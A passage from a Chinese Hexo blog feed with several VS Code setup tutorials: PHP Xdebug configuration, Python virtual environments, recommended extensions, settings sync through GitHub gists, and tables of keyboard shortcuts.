src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210107153018103.png" alt="image-20210107153018103"></p><p>可以看到php-xdebug的配置文件。</p><p>我的配置如下：</p><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">zend_extension</span>=xdebug.so<span class="hljs-attr">xdebug.mode</span> = debug<span class="hljs-attr">xdebug.start_with_request</span> = <span class="hljs-literal">yes</span><span class="hljs-attr">xdebug.client_port</span> = <span class="hljs-number">9000</span><span class="hljs-attr">xdebug.remote_host</span>=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-attr">xdebug.remote_handler</span>=dbgp<span class="hljs-attr">xdebug.idekey</span>=PHPSTORM<span class="hljs-attr">xdebug.default_enable</span>=<span class="hljs-number">1</span></code></pre></div><p>补充：</p><p>Xdebug从2.0到3.0在配置上发生了变化，老的教程配置可能是下面这样</p><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">zend_extension</span>=xdebug.so <span class="hljs-attr">xdebug.remote_enable</span>=<span class="hljs-number">1</span><span class="hljs-attr">xdebug.remote_autostart</span>=<span class="hljs-number">1</span><span class="hljs-attr">xdebug.remote_host</span>=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-attr">xdebug.remote_port</span>=<span class="hljs-number">9000</span><span class="hljs-attr">xdebug.remote_handler</span>=dbgp<span class="hljs-attr">xdebug.idekey</span>=PHPSTORM</code></pre></div><p><a href="https://marketplace.visualstudio.com/items?itemName=felixfbecker.php-debug">PHP Debug Adapter for Visual Studio Code</a> 一文中对3.xx版本的xdebug配置变化进行了说明：</p><blockquote><p>Enable remote debugging in your <code>php.ini</code>:</p><p>For XDebug v3.x.x:</p><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">xdebug.mode</span> = debug<span class="hljs-attr">xdebug.start_with_request</span> = <span class="hljs-literal">yes</span><span class="hljs-attr">xdebug.client_port</span> = <span class="hljs-number">9000</span></code></pre></div><p>For XDebug v2.x.x:</p><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">xdebug.remote_enable</span> = <span class="hljs-number">1</span><span class="hljs-attr">xdebug.remote_autostart</span> = <span class="hljs-number">1</span></code></pre></div></blockquote><h2 id="浏览器配置Xdebug-helper"><a href="#浏览器配置Xdebug-helper" class="headerlink" title="浏览器配置Xdebug helper"></a>浏览器配置Xdebug helper</h2><p>在google和firefix插件搜索Xdebug helper，安装即可。<br>配置一下IDE Key<br><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210107153718107.png" alt="image-20210107153718107"></p><h2 id="f5调试"><a href="#f5调试" class="headerlink" title="f5调试"></a>f5调试</h2><p>按f5，选择Listen for xdebug就可以了</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://blog.csdn.net/lpwmm/article/details/86369205">Visual Studio Code配置PHP 7.3开发环境+xdebug调试</a></li><li><a href="https://m.php.cn/tool/vscode/430435.html">vscode php 插件</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
      <category>vscode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vscode</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vs Code Python开发环境配置</title>
    <link href="/2021/01/07/Vs-Code-Python%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <url>/2021/01/07/Vs-Code-Python%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="Vs-Code-Python开发环境配置"><a href="#Vs-Code-Python开发环境配置" class="headerlink" title="Vs Code Python开发环境配置"></a>Vs Code Python开发环境配置</h1><h2 id="安装扩展"><a href="#安装扩展" class="headerlink" title="安装扩展"></a>安装扩展</h2><blockquote><p>单击VSCode左侧菜单栏-Extension图标，输入Python进行搜索，在下方的Python扩展程序中点击安装即可。</p><p>选择编译器，Ctrl+Shift+P，键入Python: Select Interpreter，选择相应安装好的Python解释器</p><p>安装Linter,一般来说完成扩展的安装后，会出现提示Linter pylint is not installed 的信息，点击安装即可。这个是用来提示错误信息的。</p></blockquote><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><blockquote><p>选择一个文件夹，建立扩展名为py的Python脚本文件，就可以运行程序了<br>按F5</p></blockquote><h2 id="虚拟环境"><a href="#虚拟环境" class="headerlink" title="虚拟环境"></a>虚拟环境</h2><p>创建虚拟环境前需要安装virtualenv库</p><p>依次运行如下命令：</p><div class="hljs code-wrapper"><pre><code class="hljs bash">pip install virtualenvvirtualenv venv --python=python2.7 或者 python -m venv .venv./venv/Scripts/activate.ps1</code></pre></div><p>要选择特定的环境，请使用Python：从命令面板（Ctrl + Shift + P）中选择“解释器”命令。<br><img src="https://code.visualstudio.com/assets/docs/python/environments/select-interpreters-command.png" alt="img"></p><p>Python：选择解释器命令</p><p>“ Python：选择解释器”命令显示可用的全局环境，conda环境和虚拟环境的列表.</p><p>例如，下图显示了多个Anaconda和CPython安装以及位于其中的conda环境和虚拟环境（env）。工作区文件夹：</p><p><img src="https://code.visualstudio.com/assets/docs/python/environments/interpreters-list.png" alt="img"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://blog.csdn.net/u012604810/article/details/82924591">VSCode编译、调试Python(Python in VSCode)</a></li><li><a href="https://code.visualstudio.com/docs/python/environments">Using Python environments in VS Code</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
      <category>vscode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vscode</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vs Code插件推荐</title>
    <link href="/2021/01/07/Vs-Code%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/"/>
    <url>/2021/01/07/Vs-Code%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/</url>
    
    <content type="html"><![CDATA[<h1 id="VS-Code-插件推荐"><a href="#VS-Code-插件推荐" class="headerlink" title="VS Code 插件推荐"></a>VS Code 插件推荐</h1><p>前言：本文主要内容转载于<a href="https://github.com/qianguyihao/Web%EF%BC%8C%E6%84%9F%E8%B0%A2%E5%8D%83%E5%8F%A4%E5%A3%B9%E5%8F%B7%E7%9A%84%E5%88%86%E4%BA%AB%EF%BC%8C%E7%84%B6%E6%88%91%E8%83%BD%E5%A4%9F%E9%9D%9E%E5%B8%B8%E9%A1%BA%E5%88%A9%E7%9A%84%E5%85%A5%E5%9D%91vscode%E3%80%82">https://github.com/qianguyihao/Web，感谢千古壹号的分享，然我能够非常顺利的入坑vscode。</a></p><p>对于主要做前端的师傅来说，<a href="https://github.com/qianguyihao/Web%E5%8E%9F%E6%96%87%E7%9A%84%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90%E9%9D%9E%E5%B8%B8%E5%85%A8%E9%9D%A2%EF%BC%8C%E8%BF%99%E9%87%8C%E6%88%91%E5%8F%AA%E6%8C%91%E4%BA%86%E4%B8%80%E4%BA%9B%E5%B9%B3%E5%B8%B8%E7%94%A8%E7%9A%84%E5%A4%9A%E7%9A%84%E8%BF%9B%E8%A1%8C%E8%AE%B0%E5%BD%95%E3%80%82">https://github.com/qianguyihao/Web原文的插件推荐非常全面，这里我只挑了一些平常用的多的进行记录。</a></p><h2 id="1、GitLens"><a href="#1、GitLens" class="headerlink" title="1、GitLens"></a>1、GitLens</h2><p>Git 神器</p><p>GitLens 在 Git 管理上有很多强大的功能，比如：</p><ul><li>将光标放置在代码的当前行，可以看到这样代码的提交者是谁，以及提交时间。这一点，是 GitLens 最便捷的功能。</li><li>查看某个 commit 的代码改动记录</li><li>查看不同的分支</li><li>可以将两个 commit 进行代码对比</li><li>甚至可以将两个 branch 分支进行整体的代码对比。这一点，简直是 GitLens 最强大的功能。当我们在不同分支 review 代码的时候，就可以用到这一招。</li></ul><h2 id="2、Chinese-Simplified-Language-Pack-for-Visual-Studio-Code"><a href="#2、Chinese-Simplified-Language-Pack-for-Visual-Studio-Code" class="headerlink" title="2、Chinese (Simplified) Language Pack for Visual Studio Code"></a>2、Chinese (Simplified) Language Pack for Visual Studio Code</h2><p>让软件显示为简体中文语言。</p><h2 id="3、sftp：文件传输"><a href="#3、sftp：文件传输" class="headerlink" title="3、sftp：文件传输"></a>3、sftp：文件传输</h2><p>如果你需要将本地文件通过 ftp 的形式上传到局域网的服务器，可以安装<code>sftp</code>这个插件，很好用。在公司会经常用到。</p><h2 id="4、vscode-icons"><a href="#4、vscode-icons" class="headerlink" title="4、vscode-icons"></a>4、vscode-icons</h2><p>vscode-icons 会根据文件的后缀名来显示不同的图标，让你更直观地知道每种文件是什么类型的。</p><h2 id="5、Markdown-Preview-Github-Styling"><a href="#5、Markdown-Preview-Github-Styling" class="headerlink" title="5、Markdown Preview Github Styling"></a>5、Markdown Preview Github Styling</h2><p>以 GitHub 风格预览 Markdown 样式，十分简洁优雅。就像下面这样，左侧书写 Markdown 文本，右侧预览 Markdown 的渲染效果：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200618_2025.png"></p><h2 id="6、Markdown-All-in-One"><a href="#6、Markdown-All-in-One" class="headerlink" title="6、Markdown All in One"></a>6、Markdown All in One</h2><p>这个插件将帮助你更高效地在 Markdown 中编写文档。</p><h2 id="7、Settings-Sync"><a href="#7、Settings-Sync" class="headerlink" title="7、Settings Sync"></a>7、Settings Sync</h2><ul><li>多台设备之间，同步 VS Code 配置。</li></ul><p>配置步骤上面说过了。</p><h2 id="8、Prettier：代码格式化"><a href="#8、Prettier：代码格式化" class="headerlink" title="8、Prettier：代码格式化"></a>8、Prettier：代码格式化</h2><p>Prettier 是一个代码格式化工具，只关注格式化，但不具备校验功能。在一个多人协同开发的团队中，统一的代码编写规范非常重要。一套规范可以让我们编写的代码达到一致的风格，提高代码的可读性和统一性。自然维护性也会有所提高。</p><h2 id="9、Beautify"><a href="#9、Beautify" class="headerlink" title="9、Beautify"></a>9、Beautify</h2><p>代码格式化工具。也挺好用</p><p>备注：相比之下，Prettier 是当前最流行的代码格式化工具，比 Beautify 用得更多。</p><h2 id="10、Polacode-2020：生成代码截图-【荐】"><a href="#10、Polacode-2020：生成代码截图-【荐】" class="headerlink" title="10、Polacode-2020：生成代码截图 【荐】"></a>10、Polacode-2020：生成代码截图 【荐】</h2><p>可以把代码片段保存成美观的图片，主题不同，代码的配色方案也不同，也也可以自定义设置图片的边框颜色、大小、阴影。</p><p>尤其是在我们做 PPT 分享时需要用到代码片段时，或者需要在网络上优雅地分享代码片段时，这一招很有用。</p><p>生成的效果如下：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200619_1403.png"></p><h2 id="11、Docker"><a href="#11、Docker" class="headerlink" title="11、Docker"></a>11、Docker</h2><p>Docker扩展使从Visual Studio Code轻松构建，管理和部署容器化应用程序变得容易。 它还提供了在容器内对Node.js，Python和.NET Core的一键式调试。</p><p><img src="https://github.com/microsoft/vscode-docker/raw/master/resources/readme/overview.gif" alt="Docker extension overview"></p><h2 id="12、Google-Translate"><a href="#12、Google-Translate" class="headerlink" title="12、Google Translate"></a>12、Google Translate</h2><p>翻译插件，虽然star没有vscode Google translate高，但是感觉查询速度更快。</p><p>快捷键 <code>Ctrl + Shift + T</code>.</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210106233909231.png" alt="image-20210106233909231"></p><h2 id="13、PHP-Debug"><a href="#13、PHP-Debug" class="headerlink" title="13、PHP Debug"></a>13、PHP Debug</h2><p>php调试必须要安装的插件，具体的php+xdebuger的调试环境会在后面介绍。</p><h2 id="14、PHP-Intelephense"><a href="#14、PHP-Intelephense" class="headerlink" title="14、PHP Intelephense"></a>14、PHP Intelephense</h2><p>PHP语法支持</p><h2 id="15、Project-Manager"><a href="#15、Project-Manager" class="headerlink" title="15、Project Manager"></a><strong>15、Project Manager</strong></h2><p>强烈推荐，管理项目非常方便，再也不用频繁的创建新窗口在打开文件夹了，使用Project Manager可以直接在不同项目间切换。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210106234504319.png" alt="image-20210106234504319"></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210106234442141.png" alt="image-20210106234442141"></p><h2 id="16、Remote-SSH"><a href="#16、Remote-SSH" class="headerlink" title="16、Remote - SSH"></a>16、Remote - SSH</h2><p>远程管理的利器</p><h2 id="17、vscode-drawio"><a href="#17、vscode-drawio" class="headerlink" title="17、vscode-drawio"></a>17、vscode-drawio</h2><p>vscode里也可以画流程图，太帅了</p><h2 id="18、XML-Formatter"><a href="#18、XML-Formatter" class="headerlink" title="18、XML Formatter"></a>18、XML Formatter</h2><p>XML文件的格式化插件</p><h2 id="19、Go"><a href="#19、Go" class="headerlink" title="19、Go"></a>19、Go</h2><p>golang支持</p><h2 id="20、Node-Debug"><a href="#20、Node-Debug" class="headerlink" title="20、Node Debug"></a>20、Node Debug</h2><p>vscode中调试nodejs的必备插件</p><h2 id="21、Python"><a href="#21、Python" class="headerlink" title="21、Python"></a>21、Python</h2><p>python插件怎么能忘，切换python版本，python虚拟环境的搭建后面进行介绍</p><p><img src="https://raw.githubusercontent.com/microsoft/vscode-python/main/images/InterpreterSelectionZoom.gif" alt="img"></p><h2 id="22、Zhihu-On-VSCode"><a href="#22、Zhihu-On-VSCode" class="headerlink" title="22、Zhihu On VSCode"></a>22、Zhihu On VSCode</h2><p>摸鱼插件哈哈</p><h2 id="常见主题插件"><a href="#常见主题插件" class="headerlink" title="常见主题插件"></a>常见主题插件</h2><p>给你的 VS Code 换个皮肤吧，免费的那种。我个人使用的是Dracula Theme </p><ul><li><p>Dracula Theme </p></li><li><p>Material Theme</p></li><li><p>Nebula Theme</p></li><li><p><a href="https://marketplace.visualstudio.com/items?itemName=zhuangtongfa.Material-theme">One Dark Pro</a></p></li><li><p>One Monokai Theme</p></li><li><p>Monokai Pro</p></li><li><p>Ayu</p></li></ul><ul><li><p><a href="https://marketplace.visualstudio.com/items?itemName=akarlsten.vscode-snazzy-akarlsten">Snazzy Plus</a></p></li><li><p><a href="https://marketplace.visualstudio.com/items?itemName=alexanderte.dainty-vscode">Dainty</a></p></li><li><p><code>SynthWave &#39;84</code></p></li></ul><ul><li>GitHub Plus Theme：白色主题</li><li>Horizon Theme：红色主题</li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://github.com/qianguyihao/Web">https://github.com/qianguyihao/Web</a></li><li><a href="https://thedarkbay797951995.wordpress.com/2020/08/15/install-vs-code-in-kali-linux/">Install Visual Studio Code (VS Code) Editor in Kali linux</a></li><li><a href="https://marketplace.visualstudio.com/items?itemName=felixfbecker.php-debug">PHP Debug Adapter for Visual Studio Code</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
      <category>vscode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vscode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vs Code配置云同步</title>
    <link href="/2021/01/07/Vs-Code%E9%85%8D%E7%BD%AE%E4%BA%91%E5%90%8C%E6%AD%A5/"/>
    <url>/2021/01/07/Vs-Code%E9%85%8D%E7%BD%AE%E4%BA%91%E5%90%8C%E6%AD%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="VS-Code-配置云同步"><a href="#VS-Code-配置云同步" class="headerlink" title="VS Code 配置云同步"></a>VS Code 配置云同步</h1><p>我们可以将配置云同步，这样的话，当我们换个电脑时，即可将配置一键同步到本地，就不需要重新安装插件了，也不需要重新配置软件。</p><p>我们还可以把配置分享其他用户，也可以把其他用户的配置给自己用。</p><p><strong>将自己本地的配置云同步到 GitHub</strong>：</p><p>（1）安装插件 <code>settings-sync</code>。</p><p>（2）安装完插件后，在插件里使用 GitHub 账号登录。</p><p>（3）登录后在 vscode 的界面中，可以选择一个别人的 gist；也可以忽略掉，然后创建一个属于自己的 gist。</p><p>（4）使用快捷键 「Command + Shift + P」，在弹出的命令框中输入 sync，并选择「更新/上传配置」，这样就可以把最新的配置上传到 GitHub。</p><p><strong>换另外一个电脑时，从云端同步配置到本地</strong>：</p><p>（1）当我们换另外一台电脑时，可以先在 VS Code 中安装 <code>settings-sync</code> 插件。</p><p>（2）安装完插件后，在插件里使用 GitHub 账号登录。</p><p>（3）登录之后，插件的界面上，会自动出现之前的同步记录：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200521_1530.png"></p><p>上图中，我们点击最新的那条记录，就可将云端的最新配置同步到本地：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200521_1550.png"></p><p>如果你远程的配置没有成功同步到本地，那可能是网络的问题，此时，可以使用快捷键 「Command + Shift + P」，在弹出的命令框中输入 sync，并选择「下载配置」，多试几次。</p><p><strong>使用其他人的配置</strong>：</p><p>如果我们想使用别人的配置，首先需要对方提供给你 gist。具体步骤如下：</p><p>（1）安装插件 <code>settings-sync</code>。</p><p>（2）使用快捷键 「Command + Shift + P」，在弹出的命令框中输入 sync，并选择「下载配置」</p><p>（3）在弹出的界面中，选择「Download Public Gist」，然后输入别人分享给你的 gist。注意，这一步不需要登录 GitHub 账号。</p><h1 id="更为详细的教程"><a href="#更为详细的教程" class="headerlink" title="更为详细的教程"></a>更为详细的教程</h1><ul><li><a href="https://blog.csdn.net/kan2016/article/details/106527374">vs code设置同步–settings sync</a></li></ul><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://github.com/qianguyihao/Web">https://github.com/qianguyihao/Web</a></li><li><a href="https://blog.csdn.net/kan2016/article/details/106527374">vs code设置同步–settings sync</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
      <category>vscode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vscode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vs Code快捷键与常用配置</title>
    <link href="/2021/01/07/Vs-Code%E5%BF%AB%E6%8D%B7%E9%94%AE%E4%B8%8E%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE/"/>
    <url>/2021/01/07/Vs-Code%E5%BF%AB%E6%8D%B7%E9%94%AE%E4%B8%8E%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="VS-Code-快捷键与常用配置"><a href="#VS-Code-快捷键与常用配置" class="headerlink" title="VS Code 快捷键与常用配置"></a>VS Code 快捷键与常用配置</h1><p>前言：本文主要内容转载于<a href="https://github.com/qianguyihao/Web%EF%BC%8C%E6%84%9F%E8%B0%A2%E5%8D%83%E5%8F%A4%E5%A3%B9%E5%8F%B7%E7%9A%84%E5%88%86%E4%BA%AB%EF%BC%8C%E7%84%B6%E6%88%91%E8%83%BD%E5%A4%9F%E9%9D%9E%E5%B8%B8%E9%A1%BA%E5%88%A9%E7%9A%84%E5%85%A5%E5%9D%91vscode%E3%80%82">https://github.com/qianguyihao/Web，感谢千古壹号的分享，然我能够非常顺利的入坑vscode。</a></p><h2 id="一、VS-Code-的介绍"><a href="#一、VS-Code-的介绍" class="headerlink" title="一、VS Code 的介绍"></a>一、VS Code 的介绍</h2><blockquote><p>VS Code 的全称是 Visual Studio Code，是一款开源的、免费的、跨平台的、高性能的、轻量级的代码编辑器。它在性能、语言支持、开源社区方面，都做得很不错。</p></blockquote><h3 id="VS-Code-的安装"><a href="#VS-Code-的安装" class="headerlink" title="VS Code 的安装"></a>VS Code 的安装</h3><ul><li>VS Code 官网：<a href="https://code.visualstudio.com/">https://code.visualstudio.com</a></li></ul><p>VS Code 的安装很简单，直接去官网下载安装包，然后双击安装即可。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190313_1750_3.png"></p><p>上图中，直接点击 download，一键下载安装即可。</p><p>linux deb包</p><div class="hljs code-wrapper"><pre><code class="hljs bash">dpkg -i ***.deb</code></pre></div><p>2020.4版本的kali可以直接使用apt对deb包进行安装，<a href="https://thedarkbay797951995.wordpress.com/2020/08/15/install-vs-code-in-kali-linux/">具体参考</a></p><div class="hljs code-wrapper"><pre><code class="hljs bash">root@kali:~/Downloads<span class="hljs-comment"># sudo apt install ./code_1.48.0-1597304990_amd64.deb </span></code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/screenshot-2020-08-15-at-3.19.41-pm.png" alt="img"></p><h2 id="二、VS-Code-快捷键"><a href="#二、VS-Code-快捷键" class="headerlink" title="二、VS Code 快捷键"></a>二、VS Code 快捷键</h2><blockquote><p>VS Code 用得熟不熟，首先就看你是否会用快捷键。以下列出的内容，都是常用快捷键，而加粗部分的快捷键，使用频率则非常高。任何工具，掌握 20%的技能，足矣应对 80% 的工作。</p></blockquote><h3 id="1、工作区快捷键"><a href="#1、工作区快捷键" class="headerlink" title="1、工作区快捷键"></a>1、工作区快捷键</h3><table><thead><tr><th align="left">Mac 快捷键</th><th align="left">Win 快捷键</th><th align="left">作用</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left"><strong>Cmd + Shift + P</strong></td><td align="left"><strong>Ctrl + Shift + P</strong>，F1</td><td align="left">显示命令面板</td><td align="left"></td></tr><tr><td align="left"><strong>Cmd + B</strong></td><td align="left"><strong>Ctrl + B</strong></td><td align="left">显示/隐藏侧边栏</td><td align="left">很实用</td></tr><tr><td align="left"><code>Cmd + \</code></td><td align="left"><code>Ctrl + \</code></td><td align="left"><strong>创建多个编辑器</strong></td><td align="left">【重要】抄代码利器</td></tr><tr><td align="left"><strong>Cmd + 1、2</strong></td><td align="left"><strong>Ctrl + 1、2</strong></td><td align="left">聚焦到第 1、第 2 个编辑器</td><td align="left">同上重要</td></tr><tr><td align="left"><strong>cmd +/-</strong></td><td align="left"><strong>ctrl +/-</strong></td><td align="left">将工作区放大/缩小（包括代码字体、左侧导航栏）</td><td align="left">在投影仪场景经常用到</td></tr><tr><td align="left">Cmd + J</td><td align="left">Ctrl + J</td><td align="left">显示/隐藏控制台</td><td align="left"></td></tr><tr><td align="left"><strong>Cmd + Shift + N</strong></td><td align="left"><strong>Ctrl + Shift + N</strong></td><td align="left">重新开一个软件的窗口</td><td align="left">很常用</td></tr><tr><td align="left">Cmd + Shift + W</td><td align="left">Ctrl + Shift + W</td><td align="left">关闭软件的当前窗口</td><td align="left"></td></tr><tr><td align="left">Cmd + N</td><td align="left">Ctrl + N</td><td align="left">新建文件</td><td align="left"></td></tr><tr><td align="left">Cmd + W</td><td align="left">Ctrl + W</td><td align="left">关闭当前文件</td><td align="left"></td></tr></tbody></table><h3 id="2、跳转操作"><a href="#2、跳转操作" class="headerlink" title="2、跳转操作"></a>2、跳转操作</h3><table><thead><tr><th align="left">Mac 快捷键</th><th align="left">Win 快捷键</th><th align="left">作用</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left">Cmd + `</td><td align="left">没有</td><td align="left">在同一个软件的<strong>多个工作区</strong>之间切换</td><td align="left">使用很频繁</td></tr><tr><td align="left"><strong>Cmd + Option + 左右方向键</strong></td><td align="left">Ctrl + Pagedown/Pageup</td><td align="left">在已经打开的<strong>多个文件</strong>之间进行切换</td><td align="left">非常实用</td></tr><tr><td align="left">Ctrl + Tab</td><td align="left">Ctrl + Tab</td><td align="left">在已经打开的多个文件之间进行跳转</td><td align="left">不如上面的快捷键快</td></tr><tr><td align="left">Cmd + Shift + O</td><td align="left">Ctrl + shift + O</td><td align="left">在当前文件的各种<strong>方法之间</strong>进行跳转</td><td align="left"></td></tr><tr><td align="left">Ctrl + G</td><td align="left">Ctrl + G</td><td align="left">跳转到指定行</td><td align="left"></td></tr><tr><td align="left"><code>Cmd+Shift+\</code></td><td align="left"><code>Ctrl+Shift+\</code></td><td align="left">跳转到匹配的括号</td><td align="left"></td></tr></tbody></table><h3 id="3、移动光标"><a href="#3、移动光标" class="headerlink" title="3、移动光标"></a>3、移动光标</h3><table><thead><tr><th align="left">Mac 快捷键</th><th align="left">Win 快捷键</th><th align="left">作用</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left">方向键</td><td align="left">方向键</td><td align="left">在<strong>单个字符</strong>之间移动光标</td><td align="left">大家都知道</td></tr><tr><td align="left"><strong>option + 左右方向键</strong></td><td align="left"><strong>Ctrl + 左右方向键</strong></td><td align="left">在<strong>单词</strong>之间移动光标</td><td align="left">很常用</td></tr><tr><td align="left"><strong>Cmd + 左右方向键</strong></td><td align="left"><strong>Fn + 左右方向键</strong></td><td align="left">在<strong>整行</strong>之间移动光标</td><td align="left">很常用</td></tr><tr><td align="left">Cmd + ←</td><td align="left">Fn + ←（或 Win + ←）</td><td align="left">将光标定位到当前行的最左侧</td><td align="left">很常用</td></tr><tr><td align="left">Cmd + →</td><td align="left">Fn + →（或 Win + →）</td><td align="left">将光标定位到当前行的最右侧</td><td align="left">很常用</td></tr><tr><td align="left">Cmd + ↑</td><td align="left">Ctrl + Home</td><td align="left">将光标定位到文章的第一行</td><td align="left"></td></tr><tr><td align="left">Cmd + ↓</td><td align="left">Ctrl + End</td><td align="left">将光标定位到文章的最后一行</td><td align="left"></td></tr><tr><td align="left">Cmd + Shift + \</td><td align="left"></td><td align="left">在<strong>代码块</strong>之间移动光标</td><td align="left"></td></tr></tbody></table><h3 id="4、编辑操作"><a href="#4、编辑操作" class="headerlink" title="4、编辑操作"></a>4、编辑操作</h3><table><thead><tr><th align="left">Mac 快捷键</th><th align="left">Win 快捷键</th><th align="left">作用</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left"><strong>Cmd + Enter</strong></td><td align="left"><strong>Ctrl + Enter</strong></td><td align="left">在当前行的下方新增一行，然后跳至该行</td><td align="left">即使光标不在行尾，也能快速向下插入一行</td></tr><tr><td align="left">Cmd+Shift+Enter</td><td align="left">Ctrl+Shift+Enter</td><td align="left">在当前行的上方新增一行，然后跳至该行</td><td align="left">即使光标不在行尾，也能快速向上插入一行</td></tr><tr><td align="left"><strong>Option + ↑</strong></td><td align="left"><strong>Alt + ↑</strong></td><td align="left">将代码向上移动</td><td align="left">很常用</td></tr><tr><td align="left"><strong>Option + ↓</strong></td><td align="left"><strong>Alt + ↓</strong></td><td align="left">将代码向下移动</td><td align="left">很常用</td></tr><tr><td align="left">Option + Shift + ↑</td><td align="left">Alt + Shift + ↑</td><td align="left">将代码向上复制</td><td align="left"></td></tr><tr><td align="left"><strong>Option + Shift + ↓</strong></td><td align="left"><strong>Alt + Shift + ↓</strong></td><td align="left">将代码向下复制</td><td align="left">写重复代码的利器</td></tr></tbody></table><h3 id="5、多光标编辑"><a href="#5、多光标编辑" class="headerlink" title="5、多光标编辑"></a>5、多光标编辑</h3><table><thead><tr><th>Mac 快捷键</th><th>Win 快捷键</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td><strong>Cmd + Option + 上下键</strong></td><td><strong>Ctrl + Alt + 上下键</strong></td><td>在连续的多列上，同时出现光标</td><td></td></tr><tr><td><strong>Option + 鼠标点击任意位置</strong></td><td><strong>Alt + 鼠标点击任意位置</strong></td><td>在任意位置，同时出现光标</td><td></td></tr><tr><td>Option + Shift + 鼠标拖动</td><td>Alt + Shift + 鼠标拖动</td><td>在选中区域的每一行末尾，出现光标</td><td></td></tr><tr><td>Cmd + Shift + L</td><td>Ctrl + Shift + L</td><td>在选中文本的所有相同内容处，出现光标</td><td></td></tr></tbody></table><p>其他的多光标编辑操作：（很重要）</p><ul><li><p>选中某个文本，然后反复按住快捷键「 <strong>Cmd + D</strong> 」键（windows 用户是按住「<strong>Ctrl + D</strong>」键）， 即可将全文中相同的词逐一加入选择。</p></li><li><p>选中一堆文本后，按住「<strong>Option + Shift + i</strong>」键（windows 用户是按住「<strong>Alt + Shift + I</strong>」键），既可在<strong>每一行的末尾</strong>都创建一个光标。</p></li></ul><h3 id="6、删除操作"><a href="#6、删除操作" class="headerlink" title="6、删除操作"></a>6、删除操作</h3><table><thead><tr><th align="left">Mac 快捷键</th><th align="left">Win 快捷键</th><th align="left">作用</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left">Cmd + shift + K</td><td align="left">Ctrl + Shift + K</td><td align="left">删除整行</td><td align="left">「Cmd + X」的作用是剪切，但也可以删除整行</td></tr><tr><td align="left"><strong>option + Backspace</strong></td><td align="left"><strong>Ctrl + Backspace</strong></td><td align="left">删除光标之前的一个单词</td><td align="left">英文有效，很常用</td></tr><tr><td align="left">option + delete</td><td align="left">Ctrl + delete</td><td align="left">删除光标之后的一个单词</td><td align="left"></td></tr><tr><td align="left"><strong>Cmd + Backspace</strong></td><td align="left"></td><td align="left">删除光标之前的整行内容</td><td align="left">很常用</td></tr><tr><td align="left">Cmd + delete</td><td align="left"></td><td align="left">删除光标之后的整行内容</td><td align="left"></td></tr></tbody></table><p>备注：上面所讲到的移动光标、编辑操作、删除操作的快捷键，在其他编辑器里，大部分都适用。</p><h3 id="7、编程语言相关"><a href="#7、编程语言相关" class="headerlink" title="7、编程语言相关"></a>7、编程语言相关</h3><table><thead><tr><th align="left">Mac 快捷键</th><th align="left">Win 快捷键</th><th align="left">作用</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left">Cmd + /</td><td align="left">Ctrl + /</td><td align="left">添加单行注释</td><td align="left">很常用</td></tr><tr><td align="left"><strong>Option + Shift + F</strong></td><td align="left">Alt + shift + F</td><td align="left">代码格式化</td><td align="left">很常用</td></tr><tr><td 